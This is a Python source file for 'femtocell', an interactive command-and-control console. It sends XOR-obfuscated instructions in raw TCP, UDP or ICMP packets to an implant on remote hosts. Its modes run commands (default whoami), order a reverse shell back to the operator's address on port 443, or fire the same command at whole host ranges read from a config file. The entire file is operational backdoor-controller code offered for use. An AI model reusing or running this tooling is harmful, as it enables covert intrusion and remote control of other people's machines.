import cmd
from email.mime import base
from re import A
from tokenize import group
from turtle import goto
import scapy.all as scapy
from prompt_toolkit import prompt
from prompt_toolkit.history import FileHistory
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
# from prompt_toolkit.contrib.completers import WordCompleter
import click
import os
import confuse

""" 
set
- mode (shell vs cmd)
- transport (i/u/t)
- lhost (get from eth adapter)
- rhost (REQUIRED)
- lport (6006)
- rport (445)
- command (whoami)
- if mode is shell, listen on lhost:lport
- if mode is cmd, use cmd option
show
- all

"""

parsedConfig = {}

baseparams = {
    "mode":"",
}

cmdparams = {
    "rhost": "",
    "rport": 445,
    "lhost": "",
    "sport": 6006,
    "command": "whoami",
    "transport": "tcp"
}

shellparams = {
    "rhost": "",
    "rport": 445,
    "lhost": "",
    "lport": 443,
    "sport": 6006,
    "transport": "tcp"
}

groupparams = {
    "group": "",
    "rhost": "",
    "rport": 445,
    "lhost": "",
    "sport": 6006,
    "command": "whoami",
    "transport": "tcp"
}

def getGroup():
    key = groupparams["group"]
    loi = []

    if parsedConfig[key] == 'hosts':
        loi.append(parsedConfig[key+':hosts'])
    elif parsedConfig[key] == 'children':
        subgroups = parsedConfig[key+':children']
        for item in subgroups:
            loi.append(parsedConfig[item+':hosts'])
    else:
        print('not valid key passed.')
        return []

    return loi

def importConfig(op_1):
    config = confuse.Configuration('t', __name__)
    config.set_file(op_1)
    configItems = config['all']['children'].get()
    for x in configItems:
        parsedConfig[x] = "x"
        if configItems[x].get('hosts'):
            parsedConfig[x] = "hosts"
            hostlist = []
            var = list(configItems[x].get('hosts').keys())[0]
            lIdx = var.find('[')
            rIdx = var.find(']')
            mIdx = var.find(':')
            lVal = var[lIdx+1:mIdx]
            rVal = var[mIdx+1:rIdx]
            for i in range(int(lVal), int(rVal)+1):
                lHalf = var[0:lIdx]
                rHalf = var[rIdx+1:len(var)]
                hostlist.append(lHalf + str(i) + rHalf)
            parsedConfig[x+":hosts"] = hostlist 
        elif configItems[x].get('children'):
            parsedConfig[x] = "children"
            parsedConfig[x+":children"] = list(configItems[x].get('children'))


def print_groups():
    pass


def xor_encrypt(byte_msg, byte_key):
    encrypt_byte = b''
    for b in byte_msg:
        # print(byte_msg, byte_key, b)
        encrypt_byte += chr(b ^ byte_key).encode()
    return encrypt_byte


def print_help():
    print("read the fucking readme")


def print_options(p):
    for item in p.keys():
        if baseparams["mode"] == "group" and item == "rhost":
            continue
        print(f"\n{item}: {p[item]}")
    print()


def main():
    print("""
    ____               __                  ____
   / __/__  ____ ___  / /_____  ________  / / /
  / /_/ _ \/ __ `__ \/ __/ __ \/ ___/ _ \/ / / 
 / __/  __/ / / / / / /_/ /_/ / /__/  __/ / /  
/_/  \___/_/ /_/ /_/\__/\____/\___/\___/_/_/   

    ~ kindtime & jake

    """)

    if not os.path.exists("./history"):
        os.system("mkdir history")

    while(True):
        user_in = prompt(u'femtocell ~ ',
                        history=FileHistory('history/main.history'),
                        auto_suggest=AutoSuggestFromHistory(),
                        ).split()
        # click.echo_via_pager(user_input)

        if(len(user_in) == 3):
            user_cmd = user_in[0]
            op_1 = user_in[1]
            op_2 = user_in[2]

            if(user_cmd == "set"):
                baseparams[op_1] = op_2
                if op_1 == "mode":
                    if baseparams["mode"] == "shell" or baseparams["mode"] == "cmd" or baseparams["mode"] == "group":
                        pass
                    else:
                        print("mode set incorrectly")
                        baseparams["mode"] = ""
        elif len(user_in) == 2:
            user_cmd = user_in[0]
            op_1 = user_in[1]
            if (user_cmd == "load"):
                if os.path.exists(op_1):
                    importConfig(op_1)
                else:
                    print("file doesn't exist")
                    continue

        elif len(user_in) == 1:
            user_cmd = user_in[0]

            if user_cmd == "exit":
                exit()
            elif user_cmd == "help":
                print_help()
            elif user_cmd == "mode":
                print_options(baseparams)
            elif user_cmd == "interact":
                if baseparams["mode"] == "shell":
                    interact(shellparams)
                elif baseparams["mode"] == "cmd":
                    interact(cmdparams)
                elif baseparams["mode"] == "group":
                    if len(parsedConfig) == 0:
                        print('no config loaded')
                        continue     
                    interact(groupparams)
                else:
                    print("you must set mode")
                    print_options(baseparams)
            else:
                print_help()
        else:
            print_help()


def interact(params):
    while True:
        user_in = prompt(f'femtocell ({baseparams["mode"]}) ~ ',
                        history=FileHistory('history/interact.history'),
                        auto_suggest=AutoSuggestFromHistory(),
                        ).split()

        if len(user_in) == 1:
            user_cmd = user_in[0]

            if user_cmd == "back" or user_cmd == "exit":
                return
            elif user_cmd == "options":
                print_options(params)
            
            elif user_cmd == "execute":
                if baseparams["mode"] == "cmd" and verify(cmdparams):
                    plaintext = "FC-CM-{}\00".format(params["command"])
                    execute(plaintext, cmdparams)
                elif baseparams["mode"] == "shell" and verify(shellparams):
                    plaintext = "FC-SH-{}\00".format(params["lhost"]) 
                    execute(plaintext, shellparams)
                elif baseparams["mode"] == "group" and verify(groupparams):
                    plaintext = "FC-CM-{}\00".format(params["command"])
                    groupList = getGroup()
                    for iplist in groupList:
                        for ip in iplist:
                            groupparams["rhost"] = ip
                            execute(plaintext, groupparams)
                else:
                    continue
            else:			
                continue
        elif len(user_in) == 3:
            user_cmd = user_in[0]
            op_1 = user_in[1]
            op_2 = user_in[2]

            if user_cmd == "set":
                if op_1 in params.keys():
                    params[op_1] = op_2
                    print_options(params)
                else:
                    print("cmd help")
            else:
                print("cmd help")
        else:
            print("cmd help")


def verify(params):
    passing = False

    if params["transport"] == "tcp" or params["transport"] == "udp" or params["transport"] == "icmp":
        passing = True
    else:
        print('transport incorrect')
        params["transport"] == "tcp"

    if baseparams["mode"] != "group" and params["rhost"] == "": # blank or is invalid ip
        print("rhost incorrect")
        passing = False

    if params["lhost"] == "": # blank or is invalid ip
        print('lhost incorrect')
        passing = False

    if baseparams["mode"] == "group" and params["group"] == "":
        print("group not set")
        passing = False

    return passing


def execute(plaintext, params):
    encrypted = xor_encrypt(plaintext.encode(), 0x10)

    if(params["transport"] == "udp"):
        scapy.send(scapy.IP(dst=params["rhost"].encode(), src=params["lhost"].encode())/
        scapy.UDP(sport=params["sport"], dport=params["rport"])/
        encrypted, verbose=False)
    elif(params["transport"] == "tcp"):
        scapy.send(scapy.IP(dst=params["rhost"].encode(), src=params["lhost"].encode())/
        scapy.TCP(sport=params["sport"], dport=params["rport"], flags="AP")/
        encrypted, verbose=False)
    elif(params["transport"] == "icmp"):
        scapy.send(scapy.IP(dst=params["rhost"].encode(), src=params["lhost"].encode())/
        scapy.ICMP(code=1, type=8)/
        encrypted, verbose=False)

    rhost = params["rhost"]
    print(f"Sending {plaintext} to {rhost}\n")

if(__name__ == "__main__"):
    main()
